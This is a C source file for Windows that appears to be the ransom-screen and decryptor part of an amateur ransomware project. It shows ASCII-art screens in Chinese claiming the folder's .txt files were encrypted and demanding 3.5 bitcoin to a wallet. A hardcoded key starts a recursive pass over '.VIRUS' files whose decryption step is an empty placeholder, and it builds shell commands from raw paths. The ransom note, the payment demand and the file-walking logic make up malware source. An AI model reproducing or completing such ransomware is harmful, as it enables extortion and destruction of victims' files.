/*
  日期：2021/1/21
  作者:于京平
  內容:主要程式已做完。
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <conio.h>

int frequency = 0;

void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);
void decryption(char *text1, char *text2);


void file_search(char *MainPosition){
  if(frequency == 0){
    system("dir /B *.VIRUS >> hack.txt");
  }
  else{
    char file[100000] = "cd ";
    strcat(file, MainPosition);
    strcat(file, " && dir /B *.VIRUS >> hack.txt");
    system(file);
    file_read(MainPosition);
  }
}

void file_read(char *MainPosition){
  FILE *fptr1;
  char text1[10000];
  if(frequency == 0){
    fptr1 = fopen("hack.txt", "r");
    while(fgets(text1, sizeof(text1), fptr1) != NULL){
      char text2[10000] = "";
      strtok(text1, "\n");
      strcat(text2, text1);
      strtok(text2, "VIRUS");
      printf("%s\n", text2);
      decryption(text1, text2);
    }
    fclose(fptr1);
    frequency++;
    folder_search(MainPosition);
  }
  else{
    char file[100000];
    strcat(text1, MainPosition);
    strcat(text1, "\\");
    strcpy(file, MainPosition);
    strcat(file, "\\hack.txt");
    fptr1 = fopen(file, "r");
    char text3[100000];
    while(fgets(text3, sizeof(text3), fptr1) != NULL){
      strcpy(text1, MainPosition);
      strcat(text1, "\\");
      char text2[10000];
      strcpy(text2, MainPosition);
      strcat(text2, "\\");
      strtok(text3, "\n");
      strcat(text2, text3);
      strcat(text1, text3);
      strtok(text2, "VIRUS");
      decryption(text1, text2);
    }
    fclose(fptr1);
    remove(file);
    folder_search(MainPosition);
  }
}

void folder_search(char *MainPosition){
  strtok(MainPosition, "\n");
  char folder[100000] = "cd ";
  strcat(folder, MainPosition);
  strcat(folder, " && dir /AD /B >> folder.txt");
  system(folder);
  char copy[100000];
  FILE *fptr;
  strcpy(folder, "");
  strcat(folder, MainPosition);
  strcat(folder, "\\folder.txt");
  fptr = fopen(folder, "r");
  char MainPosition2[100000];
  strcpy(MainPosition2, MainPosition);
  while(fgets(copy, sizeof(copy), fptr) != NULL){
    strtok(copy, "\n");
    strcat(MainPosition, "\\");
    strcat(MainPosition, copy);
    file_search(MainPosition);
    strcpy(MainPosition, MainPosition2);
  }
  fclose(fptr);
  remove(folder);
}

void decryption(char *text1, char *text2){
  FILE *fptr1, *fptr2;
  fptr1 = fopen(text1, "rb");
  fptr2 = fopen(text2, "wb");

  unsigned char ch;
  while(!feof(fptr1)){
   fread(&ch, sizeof(ch), 1, fptr1);
    if(!feof(fptr1)){
      //解密的地方
      
      fwrite(&ch, sizeof(ch), 1, fptr2);
    }
  }
  fclose(fptr1);
  fclose(fptr2);
  remove(text1);
}

int main(void){
  printf("          *                    *                                                    \n");
  printf("         * *                  * *                                                   \n");
  printf("        *   *                *   *                                                  \n");
  printf("       *     *              *     *                                                 \n");
  printf("      *       *            *       *                                                \n");
  printf("     *         *          *         *                                               \n");
  printf("    *           **********           *      你在此資料夾所有txt附檔名的檔案都被我加密了，\n");
  printf("   *    ****                   ****   *     如果想要回你的檔案，就按照我說的做。        \n");
  printf("  *       ********       ********      *                                            \n");
  printf(" *          *******************         *                                           \n");
  printf("*            *****      *****            *                                          \n");
  printf("*         *   ***    *   ***     *        *                                         \n");
  printf(" *          *       ***       *           *                                         \n");
  printf("  *           *      *      *            *                                          \n");
  printf("   *   *  *  *               *  *  *    *                                           \n");
  printf("    *        *      * *     *          *                                            \n");
  printf("     *     *         *        *      *                                              \n");
  printf("      *   *                     *   *                                               \n");
  printf("     *                               *                                              \n");
  printf("    *                                 *                                             \n");
  printf("   *                                   *                                            \n");
  printf("  *                                     *                                           \n");
  printf(" *                                       *                                          \n");
  printf("*                                         *                                         \n");
  printf("*******************************************                                         \n");
  printf("____________________________________________________________________________________\n");
  printf("1>{我該怎麼辦} 2>你是誰 3>我有解密金鑰\n");
  int ch, a;
  while(1){
    if(_kbhit()){
      ch = _getch();
      if(ch == 49){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      你在此資料夾所有txt附檔名的檔案都被我加密了，\n");
	printf("   *    ****                   ****   *     如果想要回你的檔案，就按照我說的做。        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>{我該怎麼辦} 2>你是誰 3>我有解密金鑰\n");
	a = ch;
      }
      else if(ch == 50){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      你在此資料夾所有txt附檔名的檔案都被我加密了，\n");
	printf("   *    ****                   ****   *     如果想要回你的檔案，就按照我說的做。        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>我該怎麼辦 2>{你是誰} 3>我有解密金鑰\n");
	a = ch;
      }
      else if(ch == 51){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *      你在此資料夾所有txt附檔名的檔案都被我加密了，\n");
	printf("   *    ****                   ****   *     如果想要回你的檔案，就按照我說的做。        \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>我該怎麼辦 2>你是誰 3>{我有解密金鑰}\n");
	a = ch;
      }
      else if(ch == 13 && a == 49){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *                                              \n");
	printf("   *    ****                   ****   *     請將3.5枚比特幣匯入這個虛擬錢包內:         \n");
	printf("  *       ********       ********      *        {WTF52695269GG11TAVNO1}             \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>{我該怎麼辦} 2>你是誰 3>我有解密金鑰\n");
      }
      else if(ch == 13 && a == 50){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *        我是生活在黑黑的網路裏的一名駭客，        \n");
	printf("   *    ****                   ****   *       最近我想買PS5，                         \n");
	printf("  *       ********       ********      *      但手頭有點緊，                          \n");
	printf(" *          *******************         *     所以想跟你要一點錢。                     \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("1>我該怎麼辦 2>{你是誰} 3>我有解密金鑰\n");
      }
      else if(ch == 13 && a == 51){
	system("cls");
	printf("          *                    *                                                    \n");
	printf("         * *                  * *                                                   \n");
	printf("        *   *                *   *                                                  \n");
	printf("       *     *              *     *                                                 \n");
	printf("      *       *            *       *                                                \n");
	printf("     *         *          *         *                                               \n");
	printf("    *           **********           *                                              \n");
	printf("   *    ****                   ****   *                                             \n");
	printf("  *       ********       ********      *                                            \n");
	printf(" *          *******************         *                                           \n");
	printf("*            *****      *****            *                                          \n");
	printf("*         *   ***    *   ***     *        *                                         \n");
	printf(" *          *       ***       *           *                                         \n");
	printf("  *           *      *      *            *                                          \n");
	printf("   *   *  *  *               *  *  *    *                                           \n");
	printf("    *        *      * *     *          *                                            \n");
	printf("     *     *         *        *      *                                              \n");
	printf("      *   *                     *   *                                               \n");
	printf("     *                               *                                              \n");
	printf("    *                                 *                                             \n");
	printf("   *                                   *                                            \n");
	printf("  *                                     *                                           \n");
	printf(" *                                       *                                          \n");
	printf("*                                         *                                         \n");
	printf("*******************************************                                         \n");
	printf("____________________________________________________________________________________\n");
	printf("請輸入你的解密金鑰: ");
	int key;
	scanf("%d", &key);
	if(key == 123){
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *        你的密鑰正確感謝你的贊助^_^ ^_^           \n");
	  printf("    *           **********           *                                              \n");
	  printf("   *    ****                   ****   *                                             \n");
	  printf("  *       ********       ********      *                                            \n");
	  printf(" *          *******************         *                                           \n");
	  printf("*            *****      *****            *                                          \n");
	  printf("*         *   ***    *   ***     *        *                                         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *               *  *  *    *                                           \n");
	  printf("    *        *      * *     *          *                                            \n");
	  printf("     *     *         *        *      *                                              \n");
	  printf("      *   *                     *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");
	  
	  char MainPosition[100000];
	  system("cd >> main_position.txt");
	  FILE *fptr;
	  fptr = fopen("main_position.txt", "r");
	  fgets(MainPosition, sizeof(MainPosition), fptr);
	  fclose(fptr);
	  remove("main_position.txt");
	  
	  file_search(MainPosition);
	  file_read(MainPosition);
	  remove("hack.txt");
	  system("cls");
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *        資料已解密完畢!!                         \n");
	  printf("    *           **********           *                                              \n");
	  printf("   *    ****                   ****   *                                             \n");
	  printf("  *       ********       ********      *                                            \n");
	  printf(" *          *******************         *                                           \n");
	  printf("*            *****      *****            *                                          \n");
	  printf("*         *   ***    *   ***     *        *                                         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *               *  *  *    *                                           \n");
	  printf("    *        *      * *     *          *                                            \n");
	  printf("     *     *         *        *      *                                              \n");
	  printf("      *   *                     *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");

	  system("pause");
	  return 0;
	}
	else{
	  printf("          *                    *                                                    \n");
	  printf("         * *                  * *                                                   \n");
	  printf("        *   *                *   *                                                  \n");
	  printf("       *     *              *     *                                                 \n");
	  printf("      *       *            *       *                                                \n");
	  printf("     *         *          *         *                                               \n");
	  printf("    *           **********           *       你的密鑰不正確                          \n");
	  printf("   *                                  *         你的密鑰不正確                        \n");
	  printf("  *       *******        *******       *           你的密鑰不正確                    \n");
	  printf(" *           *              *           *              你的密鑰不正確                 \n");
	  printf("*            *              *            *                  你的密鑰不正確           \n");
	  printf("*         *          *           *        *                     你的密鑰不正確         \n");
	  printf(" *          *       ***       *           *                                         \n");
	  printf("  *           *      *      *            *                                          \n");
	  printf("   *   *  *  *    *      *   *  *  *    *                                           \n");
	  printf("    *        *     *    *   *          *                                            \n");
	  printf("     *     *       *    *     *      *                                              \n");
	  printf("      *   *       *      *      *   *                                               \n");
	  printf("     *                               *                                              \n");
	  printf("    *                                 *                                             \n");
	  printf("   *                                   *                                            \n");
	  printf("  *                                     *                                           \n");
	  printf(" *                                       *                                          \n");
	  printf("*                                         *                                         \n");
	  printf("*******************************************                                         \n");
	  printf("____________________________________________________________________________________\n");
	}
      }
    }
  }
  
  

  
  system("pause");
  return 0;
}
